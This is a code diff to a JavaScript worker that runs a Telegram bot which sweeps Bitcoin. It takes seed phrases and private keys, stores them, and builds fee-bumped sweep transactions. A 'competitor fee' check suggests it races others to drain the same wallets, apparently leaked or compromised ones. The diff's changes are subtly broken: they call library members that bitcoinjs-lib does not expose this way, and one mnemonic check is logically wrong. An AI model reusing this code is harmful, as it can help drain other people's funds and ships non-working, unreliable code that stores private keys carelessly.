@@ -1,20 +1,20 @@
 // worker.js – Bitcoin Auto-Sweeper with Telegram Bot
-// Use dynamic import to ensure Buffer is defined before tiny-secp256k1 loads.
+// All imports are dynamic to ensure Buffer is set before any bitcoin lib loads.
 
-import { Buffer } from 'buffer';
+// Polyfill Buffer first
+const { Buffer } = await import('buffer');
 globalThis.Buffer = Buffer;
 
-// Dynamically import tiny-secp256k1 after Buffer is set
-const eccModule = await import('tiny-secp256k1');
-const ecc = eccModule.default; // or eccModule if it's a namespace
+// Now dynamically import Bitcoin libraries (they'll have Buffer available)
+const bitcoin = await import('bitcoinjs-lib');
+const bip39 = await import('bip39');
+const { BIP32Factory } = await import('bip32');
 
-// Now import other modules (they may also need Buffer, but it's already set)
-import * as bitcoin from 'bitcoinjs-lib';
-import * as bip39 from 'bip39';
-import { BIP32Factory } from 'bip32';
+// tiny-secp256k1 is a dependency of bitcoinjs-lib, loaded via that import.
+// No need to import it separately.
 
-const bip32 = BIP32Factory(ecc);
-const NETWORK = bitcoin.networks.bitcoin;
+const bip32 = BIP32Factory(bitcoin.default?.ecc ?? bitcoin.ecc);
+const NETWORK = bitcoin.default?.networks?.bitcoin ?? bitcoin.networks.bitcoin;
 const DEFAULT_SAT_PER_BYTE = 15;
 
 const ESPLORA_API = 'https://blockstream.info/api';
@@ -25,39 +25,26 @@ const PATHS = {
   native: "m/84'/0'/0'/0/0"
 };
 
-// ---------- (the rest of your code stays exactly the same) ----------
-// I'll include the complete code below for convenience, but you can copy from your previous version.
-// Just make sure the top part is as shown above.
-
-// ============================================================
-// All helper functions, sweepAll, handleTelegramUpdate, and export
-// must be defined below. They are identical to the previous version.
-// ============================================================
-
-// Since the dynamic import is top-level, the entire module becomes async.
-// We must wrap the worker export in an async function or use top-level await.
-// The code below uses top-level await, which is supported in Workers with module syntax.
-
 // ---------- Helper functions (unchanged) ----------
 function deriveKeyPairFromMnemonic(mnemonic, path) {
-  const seed = bip39.mnemonicToSeedSync(mnemonic);
+  const seed = bip39.default?.mnemonicToSeedSync?.(mnemonic) ?? bip39.mnemonicToSeedSync(mnemonic);
   const root = bip32.fromSeed(seed, NETWORK);
   const child = root.derivePath(path);
-  return bitcoin.ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
+  return bitcoin.default?.ECPair?.fromPrivateKey?.(child.privateKey, { network: NETWORK }) ?? bitcoin.ECPair.fromPrivateKey(child.privateKey, { network: NETWORK });
 }
 
 function getAddressAndKeyPair(mnemonic, type) {
   const keyPair = deriveKeyPairFromMnemonic(mnemonic, PATHS[type]);
   let payment;
   if (type === 'legacy') {
-    payment = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    payment = (bitcoin.default?.payments?.p2pkh ?? bitcoin.payments.p2pkh)({ pubkey: keyPair.publicKey, network: NETWORK });
   } else if (type === 'segwit') {
-    payment = bitcoin.payments.p2sh({
-      redeem: bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK }),
+    payment = (bitcoin.default?.payments?.p2sh ?? bitcoin.payments.p2sh)({
+      redeem: (bitcoin.default?.payments?.p2wpkh ?? bitcoin.payments.p2wpkh)({ pubkey: keyPair.publicKey, network: NETWORK }),
       network: NETWORK
     });
   } else if (type === 'native') {
-    payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: NETWORK });
+    payment = (bitcoin.default?.payments?.p2wpkh ?? bitcoin.payments.p2wpkh)({ pubkey: keyPair.publicKey, network: NETWORK });
   }
   return { address: payment.address, keyPair };
 }
@@ -130,7 +117,7 @@ async function getHighestCompetitorFee(address) {
 }
 
 async function createSweepTx(keyPair, utxos, toAddress, feeSats, rbf = true) {
-  const txb = new bitcoin.TransactionBuilder(NETWORK);
+  const txb = new (bitcoin.default?.TransactionBuilder ?? bitcoin.TransactionBuilder)(NETWORK);
   let totalInput = 0;
   utxos.forEach(utxo => {
     txb.addInput(utxo.txid, utxo.vout);
@@ -399,7 +386,7 @@ async function handleTelegramUpdate(update, env) {
   const words = text.trim().split(/\s+/);
   if (words.length >= 12 && words.length <= 24) {
     try {
-      if (!bip39.validateMnemonic(words.join(' '))) {
+      if (!bip39.default?.validateMnemonic?.(words.join(' ')) ?? !bip39.validateMnemonic(words.join(' '))) {
         await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid mnemonic.');
         return;
       }
@@ -424,8 +411,8 @@ async function handleTelegramUpdate(update, env) {
   if (/^[LK5][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(text.trim())) {
     try {
       const wif = text.trim();
-      const keyPair = bitcoin.ECPair.fromWIF(wif, NETWORK);
-      const address = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK }).address;
+      const keyPair = bitcoin.default?.ECPair?.fromWIF?.(wif, NETWORK) ?? bitcoin.ECPair.fromWIF(wif, NETWORK);
+      const address = (bitcoin.default?.payments?.p2pkh ?? bitcoin.payments.p2pkh)({ pubkey: keyPair.publicKey, network: NETWORK }).address;
       const key = `wallets_${chatId}`;
       const wallets = await env.WALLETS.get(key, 'json') || [];
       const exists = wallets.some(w => w.wif === wif);
